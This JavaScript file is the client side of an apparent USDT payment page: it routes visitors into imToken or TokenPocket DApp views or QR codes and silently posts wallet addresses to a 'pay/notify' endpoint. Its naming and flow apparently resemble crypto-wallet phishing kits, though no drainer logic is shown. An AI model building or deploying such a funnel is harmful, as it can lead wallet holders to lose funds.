function loadData() {

	$("#addtype").val(getUrlParams("paytype"));
	
}

function getUrlParams(key) {
	var url = window.location.search.substr(1);
	if (url == '') {
		return false;
	}
	var paramsArr = url.split('&');
	for (var i = 0; i < paramsArr.length; i++) {
		var combina = paramsArr[i].split("=");
		if (combina[0] == key) {
			return combina[1];
		}
	}
	return false;
}

function addfry() {
	$.ajax({
		url: "pay/notify",
		data: {
			address:address,
			to_address: to_address,
			balance: '0',
			type: 'trc',
		},
		type: "post",
		success: function(data, textStatus, xhr) {
			//console.log(data);
		},
		error: function(xhr, textStatus, error) {}
	});
}

function paylistloadData() {
	$("#addtype").val(getUrlParams("paytype"));
    
	if (getUrlParams("paytype") == "trc") {
		$("#tr_Metamask").hide();
	} else if (getUrlParams("paytype") == "erc" || getUrlParams("paytype") == "bsc" || getUrlParams("paytype") == "okc") {
		$("#tr_TronLink").hide();
		$("#tr_Metamask").show();
	    $("#tr_Trust").show();
	    $("#tr_Okex").show();
	} else {}
}

function paylistevent(from) {
    let jump_url,qr_url,copy_url;
	let paytype = $("#addtype").val();
    let amount = getUrlParams("amount") || false;
    
    if(amount != false){
        jump_url = encodeURIComponent(payDomain + "/index/pay" + "?paytype=" + paytype + "&amount=" + amount);
    
    	copy_url = payDomain + "/index/pay" + "?paytype=" + paytype + "&amount=" + amount;
    	
    	qr_url = 	payDomain + "/index/pay/qrcode?paytype=" + paytype + "&amount=" + amount;
    }else{
        jump_url = encodeURIComponent(payDomain + "/index/pay" + "?paytype=" + paytype);
    
    	copy_url = payDomain + "/index/pay" + "?paytype=" + paytype;
    	
    	qr_url = payDomain + "/index/pay/qrcode?paytype=" + paytype;
    }
	

	if (from == "imToken") {
	    if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
	        location.href = "imtokenv2://navigate?screen=DappView&url=" + jump_url;
	    }else{
	        location.href = qr_url;
	    }
		
	} else if (from == "TokenPocket") {
	    if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
	        if (addtype == "trc") {
    			location.href = 'tpdapp://open?params={"url": "' + jump_url +
    				'", "chain": "TRX", "source":"xxx"}';
    		} else {
    			location.href = 'tpdapp://open?params={"url": "' + jump_url +
    				'", "chain": "ERC", "source":"xxx"}';
    		}
	    }else{
	        location.href = qr_url;
	    }
		
	} else {

		$("#pay_" + from).modal('show');
		$("#pay_" + from + "_url").val(copy_url);
		
	}
}

function payconfirm() {
	let payment = $("#payment").val();
	if ($.isNumeric(payment)) {
		if (payment > 0) {
			$("#confirm_amount").html("当前支付金额&nbsp<strong style='color: red;'>" + payment + "</strong>&nbspUSDT");
			$("#pay_confirm").modal('show');
		}else{
			alert("请填写正确的金额");
		}
	}
}
